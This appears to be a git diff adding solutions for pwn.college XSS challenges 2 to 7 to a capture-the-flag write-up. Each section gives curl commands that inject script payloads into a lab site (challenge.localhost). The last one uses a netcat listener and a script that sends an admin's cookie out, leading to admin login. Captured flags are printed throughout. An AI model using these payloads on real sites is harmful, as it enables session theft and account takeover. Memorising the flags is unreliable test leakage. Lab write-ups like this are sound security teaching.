@@ -215,3 +215,103 @@ then run the victims script to check to see if he gets our html:
 ```
 
 pwn.college{gXXTEtO0VaLz4b_py4ji5hxxVZZ.dVzN1YDL5ETN1QzW}
+
+
+## XSS 2
+
+```bash
+curl "http://challenge.localhost" -d "content=<script>alert(\"PWNED\")</script>"
+```
+
+then run the victims script to check to see if he rund our script:
+
+```bash
+./victim
+```
+
+pwn.college{YD-mkDHJs2-3D_s2_eTcFjmPp_Y.ddzN1YDL5ETN1QzW}
+
+
+## XSS 3
+
+```bash
+/challenge/victim "http://challenge.localhost?msg=<script>alert(\"PWNED\")</script>"
+```
+
+pwn.college{8FQz8wKg0k_ANGFNsKp1xoGnem7.dRTOzMDL5ETN1QzW}
+
+
+## XSS 4
+
+```bash
+/challenge/victim "http://challenge.localhost?msg=</textarea><script>alert(\"PWNED\")</script><textarea>"
+```
+
+pwn.college{Mgvy8FPyrMFXfNUrdWdMjilYHUI.dVTOzMDL5ETN1QzW}
+
+
+## XSS 5
+
+Log in as user, password is "password"
+
+
+```js
+<script>fetch("http://challenge.localhost/publish");</script>
+```
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
+curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://challenge.localhost:80/publish')</script>"
+curl -b cookies.txt http://challenge.localhost:80/publish
+/challenge/victim
+curl -b cookies.txt http://challenge.localhost:80/
+```
+
+pwn.college{oNjHuja-yhK_R9Jo4-GrCtm1Nlr.dZTOzMDL5ETN1QzW}
+
+
+## XSS 6
+
+Log in as user, password is "password"
+
+```js
+<script>fetch('http://challenge.localhost:80/publish',{method: 'POST'})</script>
+```
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
+curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://challenge.localhost:80/publish',{method: 'POST'})</script>"
+curl -b cookies.txt -X POST http://challenge.localhost:80/publish
+/challenge/victim
+curl -b cookies.txt http://challenge.localhost:80/
+```
+
+pwn.college{c9KktljAhjvrvc1t753YGdOLXrC.dBDO1YDL5ETN1QzW}
+
+
+## XSS 7
+
+Log in as user, password is "password"
+
+```bash
+nc -lvnp 5000 &
+```
+```js
+<script>fetch('http://localhost:5000?'+document.cookie)</script>
+```
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=guest&password=password"
+curl -b cookies.txt "http://challenge.localhost:80/draft" -d "content=<script>fetch('http://localhost:5000?'%2Bdocument.cookie)</script>"
+curl -b cookies.txt -X POST http://challenge.localhost:80/publish
+/challenge/victim
+```
+
+nc catches the admin password, so we can now login as admin to see his drafts.
+
+```bash
+curl -c cookies.txt -X POST "http://challenge.localhost:80/login" -d "username=admin&password=YA.dJDO1YDL5ETN1QzW}"
+curl -b cookies.txt "http://challenge.localhost:80"
+```
+
+pwn.college{U0-aNStAuHMrzlr55C57ZbTebYA.dJDO1YDL5ETN1QzW}
